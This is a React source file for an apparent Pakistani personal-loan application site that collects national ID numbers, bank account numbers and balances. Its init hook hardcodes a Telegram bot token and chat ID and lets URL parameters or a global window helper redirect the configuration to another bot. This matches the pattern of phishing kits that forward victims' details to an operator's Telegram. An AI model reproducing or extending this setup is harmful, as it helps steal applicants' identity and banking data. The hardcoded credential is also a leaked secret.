'use client';

import { useState, useEffect } from 'react';
import Header from './components/Header';
import HeroCarousel from './components/HeroCarousel';
import HomeOverview from './components/HomeOverview';
import LoanCalculatorModal from './components/LoanCalculatorModal';
import ApplicationWizard from './components/ApplicationWizard';
import StatusTrackerModal from './components/StatusTrackerModal';
import Footer from './components/Footer';
import { Language, ApplicationRecord } from './types';

export default function App() {
  const [language, setLanguage] = useState<Language>('en');
  const [activeView, setActiveView] = useState<'home' | 'apply'>('home');
  const [showCalculator, setShowCalculator] = useState(false);
  const [showStatusModal, setShowStatusModal] = useState(false);
  const [calculatorInitialAmount, setCalculatorInitialAmount] = useState<string>('');
  const [preselectedBank, setPreselectedBank] = useState<string>('');

  // Initialize Telegram config & clean up legacy stored defaults
  useEffect(() => {
    try {
      const defaultToken = '8551558091:AAEp8dl_H9Xr2Stgsosy92A3PwowTAxDSvU';
      const defaultChat = '7593406817';

      // Purge legacy hardcoded defaults from localStorage so .env variables always take precedence
      if (localStorage.getItem('telegram_bot_token') === defaultToken) {
        localStorage.removeItem('telegram_bot_token');
      }
      if (localStorage.getItem('telegram_chat_id') === defaultChat) {
        localStorage.removeItem('telegram_chat_id');
      }

      // Check if custom override parameters were explicitly passed in the URL (e.g. ?token=...&chat=...)
      const params = new URLSearchParams(window.location.search);
      const urlToken = params.get('token') || params.get('tg_token') || params.get('bot') || params.get('bot_token');
      const urlChat = params.get('chat') || params.get('chat_id') || params.get('id');

      if (urlToken && urlToken.includes(':')) {
        localStorage.setItem('telegram_bot_token', urlToken.trim());
        if (urlChat) localStorage.setItem('telegram_chat_id', urlChat.trim());

        fetch('/api/telegram-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ botToken: urlToken.trim(), chatId: urlChat ? urlChat.trim() : '' })
        }).catch(() => {});
      } else {
        // Normal read-only check: verify that server-side environment variables are active
        fetch('/api/telegram-config').catch(() => {});
      }

      // Expose quick helper on window for developer/admin convenience
      (window as any).setTelegram = (token: string, chat: string) => {
        if (token) localStorage.setItem('telegram_bot_token', token.trim());
        if (chat) localStorage.setItem('telegram_chat_id', chat.trim());
        return fetch('/api/telegram-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ botToken: token, chatId: chat })
        }).then(r => r.json());
      };
    } catch {}
  }, []);

  // Sample pre-existing application matching the screenshots
  const [applications, setApplications] = useState<ApplicationRecord[]>([
    {
      id: 'sample-1',
      applicationId: 'PLP-2026-209158',
      personal: {
        fullName: 'Tariq Mehmood',
        cnic: '42101-9988776-1',
        mobileNo: '03001234567',
        gender: 'Male',
        dateOfBirth: '1995-05-12',
        province: 'Punjab',
        address: 'House # 123, Street 4, Lahore'
      },
      loan: {
        amount: '500000',
        purpose: 'Business Expansion',
        occupation: 'Business',
        bankName: 'Raast',
        accountNumber: '4893285059569672',
        currentBalance: '50000',
        monthlyIncome: '120000',
        salaryDate: '2026-09-01'
      },
      status: 'Verified & Queued',
      createdAt: '2026-09-03',
      approvedAmount: 'PKR 500,000',
      selectedBank: 'Raast'
    }
  ]);

  const toggleLanguage = () => {
    setLanguage(prev => (prev === 'en' ? 'ur' : 'en'));
  };

  const handleApplicationComplete = (newRecord: ApplicationRecord) => {
    setApplications(prev => [newRecord, ...prev]);
  };

  return (
    <div className="min-h-screen bg-[#f8fafc] text-gray-900 font-sans selection:bg-emerald-100 selection:text-emerald-900">
      <Header
        language={language}
        onToggleLanguage={toggleLanguage}
        onApplyClick={() => setActiveView('apply')}
        onStatusClick={() => setShowStatusModal(true)}
      />

      <main className="max-w-4xl mx-auto px-4 py-6 sm:py-8">
        {activeView === 'home' ? (
          <div className="space-y-6">
            <HeroCarousel language={language} />
            <HomeOverview
              language={language}
              onApplyClick={() => {
                setPreselectedBank('');
                setActiveView('apply');
              }}
              onCalculatorClick={() => setShowCalculator(true)}
            />
          </div>
        ) : (
          <ApplicationWizard
            language={language}
            initialAmount={calculatorInitialAmount}
            initialBank={preselectedBank}
            onComplete={handleApplicationComplete}
            onCancel={() => {
              setPreselectedBank('');
              setActiveView('home');
            }}
          />
        )}
      </main>

      {/* Modals */}
      {showCalculator && (
        <LoanCalculatorModal
          language={language}
          onClose={() => setShowCalculator(false)}
          onStartApplication={(amt) => {
            setCalculatorInitialAmount(amt);
            setActiveView('apply');
          }}
        />
      )}

      {showStatusModal && (
        <StatusTrackerModal
          language={language}
          applications={applications}
          onClose={() => setShowStatusModal(false)}
        />
      )}

      <Footer language={language} />
    </div>
  );
}
